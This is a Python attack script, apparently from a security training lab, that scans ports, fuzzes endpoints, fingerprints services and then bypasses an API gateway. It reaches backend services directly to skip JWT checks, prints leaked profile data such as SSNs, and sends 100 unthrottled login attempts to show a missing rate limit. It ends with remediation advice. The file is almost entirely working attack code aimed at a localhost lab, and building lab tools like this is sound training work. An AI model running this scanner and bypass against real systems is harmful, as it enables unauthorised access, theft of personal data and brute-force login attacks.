#!/usr/bin/env python3
"""
Intelligent Direct Access Attack
Advanced gateway bypass with service fingerprinting and discovery.

UPGRADES FROM BASIC VERSION:
1. Service Discovery:
   - Automated port scanning
   - Endpoint fuzzing
   - Service mesh mapping

2. Service Fingerprinting:
   - Framework/version detection
   - Known vulnerability matching
   - Technology stack identification

3. Protocol Analysis:
   - HTTP verb tampering
   - Header injection testing
   - Response analysis

4. Intelligence Gathering:
   - Complete service mesh map
   - Vulnerability assessment
   - Attack surface analysis

Author: DevSecOps Hacking Lab
"""

import asyncio
import httpx
import json
import time
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

from service_discovery import ServiceDiscovery, DiscoveredService
from service_fingerprinting import ServiceFingerprinter, ServiceFingerprint


class IntelligentDirectAccessAttack:
    """
    Advanced gateway bypass attack with intelligence.

    Real pentesters don't just hit known endpoints - they:
    1. Discover all exposed services
    2. Fingerprint technology stack
    3. Map service mesh architecture
    4. Identify known vulnerabilities
    5. Test protocol-level attacks
    """

    def __init__(
        self,
        gateway_url: str = "http://localhost:8080",
        scan_port_range: tuple = (8000, 9100),
        timeout: float = 2.0
    ):
        self.gateway_url = gateway_url
        self.scan_port_range = scan_port_range
        self.timeout = timeout
        self.console = Console()

        # Intelligence modules
        self.service_discovery = ServiceDiscovery(timeout=1.0, max_workers=10)
        self.service_fingerprinter = ServiceFingerprinter()

        # Results tracking
        self.results = {
            "attack_name": "Intelligent Direct Access (Gateway Bypass)",
            "timestamp": datetime.now().isoformat(),
            "gateway_url": gateway_url,
            "discovered_services": [],
            "service_fingerprints": [],
            "vulnerabilities": [],
            "bypassed_controls": [],
            "data_exfiltrated": [],
            "metrics": {
                "services_discovered": 0,
                "endpoints_found": 0,
                "vulnerabilities_found": 0,
                "successful_bypasses": 0,
            }
        }

    def banner(self):
        """Print attack banner"""
        banner_text = """
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
[bold white]🎭 INTELLIGENT DIRECT ACCESS ATTACK - Gateway Bypass[/bold white]
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]

[yellow]Gateway (protected):[/yellow] {gateway}
[yellow]Scan Range:[/yellow] Ports {start} - {end}

[bold red]VULNERABILITY:[/bold red] Backend services exposed without authentication
[bold yellow]IMPACT:[/bold yellow] Complete bypass of Gateway security controls

[bold green]INTELLIGENCE FEATURES:[/bold green]
  • Automated service discovery (port scanning)
  • Framework fingerprinting (version detection)
  • Known vulnerability matching (CVE database)
  • Service mesh mapping
  • Protocol-level attack testing

[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
""".format(
            gateway=self.gateway_url,
            start=self.scan_port_range[0],
            end=self.scan_port_range[1]
        )
        self.console.print(Panel(banner_text, border_style="cyan"))

    async def phase1_service_discovery(self) -> List[DiscoveredService]:
        """
        Phase 1: Discover all exposed services.

        Uses port scanning and endpoint fuzzing.
        """
        self.console.print("\n[bold][*][/bold] Phase 1: Service Discovery")

        # Port scan
        self.console.print(f"    [blue][>][/blue] Scanning ports {self.scan_port_range[0]}-{self.scan_port_range[1]}...")

        discovered = await asyncio.to_thread(
            self.service_discovery.scan_ports,
            "localhost",
            self.scan_port_range[0],
            self.scan_port_range[1]
        )

        self.results["metrics"]["services_discovered"] = len(discovered)

        if discovered:
            self.console.print(f"    [green][✓][/green] Found {len(discovered)} services")

            # Discover endpoints on each service
            for service in discovered:
                if service.service_type and "HTTP" in service.service_type:
                    base_url = f"http://{service.host}:{service.port}"
                    self.console.print(f"    [blue][>][/blue] Fuzzing endpoints on {base_url}")

                    endpoints = await asyncio.to_thread(
                        self.service_discovery.discover_endpoints,
                        base_url
                    )

                    service.endpoints = [ep["path"] for ep in endpoints]
                    self.results["metrics"]["endpoints_found"] += len(endpoints)

                    if endpoints:
                        self.console.print(f"        [green][+][/green] Found {len(endpoints)} endpoints")

            # Save discovered services
            self.results["discovered_services"] = [
                {
                    "host": s.host,
                    "port": s.port,
                    "type": s.service_type,
                    "endpoints": s.endpoints
                }
                for s in discovered
            ]
        else:
            self.console.print("    [yellow][!][/yellow] No services discovered")

        return discovered

    async def phase2_service_fingerprinting(
        self,
        discovered_services: List[DiscoveredService]
    ) -> List[ServiceFingerprint]:
        """
        Phase 2: Fingerprint discovered services.

        Identifies framework, version, and vulnerabilities.
        """
        self.console.print("\n[bold][*][/bold] Phase 2: Service Fingerprinting")

        fingerprints = []

        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for service in discovered_services:
                if service.service_type and "HTTP" in service.service_type:
                    url = f"http://{service.host}:{service.port}"
                    self.console.print(f"    [blue][>][/blue] Fingerprinting {url}")

                    try:
                        response = await client.get(url)

                        # Fingerprint service
                        fingerprint = self.service_fingerprinter.fingerprint_service(
                            url=url,
                            response_headers=dict(response.headers),
                            response_body=response.text,
                            response_time=response.elapsed.total_seconds()
                        )

                        fingerprints.append(fingerprint)

                        # Show fingerprint
                        if fingerprint.framework:
                            version = f" {fingerprint.framework_version}" if fingerprint.framework_version else ""
                            self.console.print(f"        [green][+][/green] Framework: {fingerprint.framework}{version}")

                        if fingerprint.technologies:
                            self.console.print(f"        [cyan][i][/cyan] Stack: {', '.join(fingerprint.technologies[:3])}")

                        if fingerprint.known_vulnerabilities:
                            self.console.print(f"        [red][!][/red] {len(fingerprint.known_vulnerabilities)} known vulnerabilities")

                    except Exception as e:
                        self.console.print(f"        [red][✗][/red] Error: {e}")

        # Save fingerprints
        self.results["service_fingerprints"] = [
            {
                "url": fp.url,
                "framework": fp.framework,
                "version": fp.framework_version,
                "technologies": fp.technologies,
                "vulnerabilities": fp.known_vulnerabilities
            }
            for fp in fingerprints
        ]

        # Collect all vulnerabilities
        for fp in fingerprints:
            self.results["vulnerabilities"].extend(fp.known_vulnerabilities)

        self.results["metrics"]["vulnerabilities_found"] = len(self.results["vulnerabilities"])

        return fingerprints

    async def phase3_gateway_bypass_testing(
        self,
        discovered_services: List[DiscoveredService]
    ):
        """
        Phase 3: Test gateway bypass attacks.

        Compare gateway access vs direct access.
        """
        self.console.print("\n[bold][*][/bold] Phase 3: Gateway Bypass Testing")

        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for service in discovered_services:
                if service.port == 8002:  # User service
                    await self._test_user_service_bypass(client, service)
                elif service.port == 8000:  # Auth service
                    await self._test_auth_service_bypass(client, service)

    async def _test_user_service_bypass(
        self,
        client: httpx.AsyncClient,
        service: DiscoveredService
    ):
        """Test bypassing user service security"""
        self.console.print(f"\n    [yellow]→[/yellow] Testing User Service Bypass (:{service.port})")

        # Test 1: Profile access through gateway (should fail)
        self.console.print("        Test 1: Profile via Gateway")
        try:
            gw_response = await client.get(f"{self.gateway_url}/api/users/profile/1")
            gw_protected = gw_response.status_code in [401, 403]
            self.console.print(f"          Gateway: HTTP {gw_response.status_code} {'(Protected)' if gw_protected else '(Vulnerable!)'}")
        except Exception as e:
            self.console.print(f"          Gateway: Error - {e}")
            gw_protected = False

        # Test 2: Profile access directly (bypasses JWT)
        self.console.print("        Test 2: Profile via Direct Access")
        try:
            direct_url = f"http://{service.host}:{service.port}/profile/1"
            direct_response = await client.get(direct_url)

            if direct_response.status_code == 200:
                self.console.print(f"          Direct: HTTP 200 [red](BYPASSED!)[/red]")

                # Track bypass
                self.results["bypassed_controls"].append({
                    "service": f"{service.host}:{service.port}",
                    "endpoint": "/profile/1",
                    "bypassed_control": "JWT validation",
                    "data_leaked": direct_response.json() if direct_response.status_code == 200 else None
                })

                self.results["metrics"]["successful_bypasses"] += 1

                # Show leaked data
                if direct_response.status_code == 200:
                    profile = direct_response.json()
                    self.console.print(f"          [red][!][/red] Leaked: {profile.get('username')}, SSN: {profile.get('ssn')}")
                    self.results["data_exfiltrated"].append(profile)
            else:
                self.console.print(f"          Direct: HTTP {direct_response.status_code} (Protected)")

        except Exception as e:
            self.console.print(f"          Direct: Error - {e}")

    async def _test_auth_service_bypass(
        self,
        client: httpx.AsyncClient,
        service: DiscoveredService
    ):
        """Test bypassing auth service rate limits"""
        self.console.print(f"\n    [yellow]→[/yellow] Testing Auth Service Bypass (:{service.port})")

        self.console.print("        Test: Rate Limiting Bypass")

        # Through gateway: rate limited
        gw_limited = False
        try:
            for i in range(15):  # Try 15 requests (limit is 60/min)
                gw_response = await client.post(
                    f"{self.gateway_url}/auth/login",
                    json={"username": "test", "password": "wrong"}
                )
                if gw_response.status_code == 429:
                    gw_limited = True
                    self.console.print(f"          Gateway: Rate limited after {i+1} attempts")
                    break

            if not gw_limited:
                self.console.print(f"          Gateway: No rate limit detected")

        except Exception as e:
            self.console.print(f"          Gateway: Error - {e}")

        # Direct access: no rate limit
        self.console.print("          Testing direct access (no rate limit)...")
        try:
            direct_url = f"http://{service.host}:{service.port}/auth/login"
            for i in range(100):  # Try 100 requests
                direct_response = await client.post(
                    direct_url,
                    json={"username": "test", "password": "wrong"}
                )

                if direct_response.status_code == 429:
                    self.console.print(f"          Direct: Rate limited after {i+1} attempts")
                    break

                if i == 99:
                    self.console.print(f"          Direct: [red]NO RATE LIMIT - 100+ requests successful[/red]")
                    self.results["bypassed_controls"].append({
                        "service": f"{service.host}:{service.port}",
                        "endpoint": "/auth/login",
                        "bypassed_control": "Rate limiting",
                        "requests_sent": 100
                    })
                    self.results["metrics"]["successful_bypasses"] += 1

        except Exception as e:
            self.console.print(f"          Direct: Error - {e}")

    async def phase4_service_mesh_mapping(
        self,
        discovered_services: List[DiscoveredService]
    ):
        """
        Phase 4: Map service mesh architecture.

        Shows relationships between services.
        """
        self.console.print("\n[bold][*][/bold] Phase 4: Service Mesh Mapping")

        mesh = self.service_discovery.map_service_mesh(discovered_services)

        if "api_gateway" in mesh["topology"]:
            gw = mesh["topology"]["api_gateway"]
            self.console.print(f"    [cyan][→][/cyan] API Gateway: {gw['port']} ({gw['type']})")

        if "backend_services" in mesh["topology"]:
            self.console.print(f"    [cyan][→][/cyan] Backend Services:")
            for backend in mesh["topology"]["backend_services"]:
                self.console.print(f"        • Port {backend['port']}: {backend['type']}")

        if mesh["relationships"]:
            self.console.print(f"\n    [cyan][→][/cyan] Service Relationships:")
            for rel in mesh["relationships"]:
                self.console.print(f"        {rel['from']} → {rel['to']} ({rel['type']})")

    async def display_intelligence_report(self):
        """Display comprehensive intelligence report"""
        self.console.print("\n" + "="*70)
        self.console.print("[bold cyan]📊 INTELLIGENCE REPORT[/bold cyan]")
        self.console.print("="*70)

        # Summary table
        summary_table = Table(title="Attack Summary", show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green", justify="right")

        summary_table.add_row("Services Discovered", str(self.results["metrics"]["services_discovered"]))
        summary_table.add_row("Endpoints Found", str(self.results["metrics"]["endpoints_found"]))
        summary_table.add_row("Vulnerabilities Found", str(self.results["metrics"]["vulnerabilities_found"]))
        summary_table.add_row("Successful Bypasses", str(self.results["metrics"]["successful_bypasses"]))
        summary_table.add_row("Data Items Exfiltrated", str(len(self.results["data_exfiltrated"])))

        self.console.print(summary_table)

        # Vulnerabilities
        if self.results["vulnerabilities"]:
            self.console.print("\n[bold red]⚠️  KNOWN VULNERABILITIES[/bold red]")
            for vuln in self.results["vulnerabilities"]:
                self.console.print(f"  • [red]{vuln['cve']}[/red] ({vuln['severity']})")
                self.console.print(f"    {vuln['description']}")

        # Bypassed controls
        if self.results["bypassed_controls"]:
            self.console.print("\n[bold yellow]🚨 BYPASSED SECURITY CONTROLS[/bold yellow]")
            for bypass in self.results["bypassed_controls"]:
                self.console.print(f"  • {bypass['service']}{bypass['endpoint']}")
                self.console.print(f"    Bypassed: {bypass['bypassed_control']}")

    def save_report(self) -> str:
        """Save detailed JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path("results")
        output_dir.mkdir(exist_ok=True)

        filename = output_dir / f"intelligent_direct_access_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)

        self.console.print(f"\n[green][✓][/green] Report saved to: {filename}")
        return str(filename)

    async def run(self):
        """Execute complete intelligent direct access attack"""
        self.banner()

        # Phase 1: Service discovery
        discovered_services = await self.phase1_service_discovery()

        if not discovered_services:
            self.console.print("\n[red][✗][/red] No services discovered, cannot continue")
            return False

        await asyncio.sleep(0.5)

        # Phase 2: Service fingerprinting
        fingerprints = await self.phase2_service_fingerprinting(discovered_services)

        await asyncio.sleep(0.5)

        # Phase 3: Gateway bypass testing
        await self.phase3_gateway_bypass_testing(discovered_services)

        await asyncio.sleep(0.5)

        # Phase 4: Service mesh mapping
        await self.phase4_service_mesh_mapping(discovered_services)

        # Display intelligence report
        await self.display_intelligence_report()

        # Save report
        self.save_report()

        # Remediation advice
        self.console.print("\n[bold yellow]💡 REMEDIATION:[/bold yellow]")
        self.console.print("   1. Implement mTLS between Gateway and services")
        self.console.print("   2. Use internal Docker network (no exposed ports)")
        self.console.print("   3. Add service-to-service authentication")
        self.console.print("   4. Patch identified vulnerabilities")
        self.console.print("   5. Monitor direct_access_total metrics for anomalies")
        self.console.print()

        return True


async def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description="Intelligent Direct Access Attack")
    parser.add_argument("--gateway", default="http://localhost:8080", help="API Gateway URL")
    parser.add_argument("--scan-start", type=int, default=8000, help="Start port for scanning")
    parser.add_argument("--scan-end", type=int, default=9100, help="End port for scanning")

    args = parser.parse_args()

    attack = IntelligentDirectAccessAttack(
        gateway_url=args.gateway,
        scan_port_range=(args.scan_start, args.scan_end)
    )

    try:
        success = await attack.run()
        return 0 if success else 1
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[✗] Attack failed: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    import sys
    sys.exit(asyncio.run(main()))
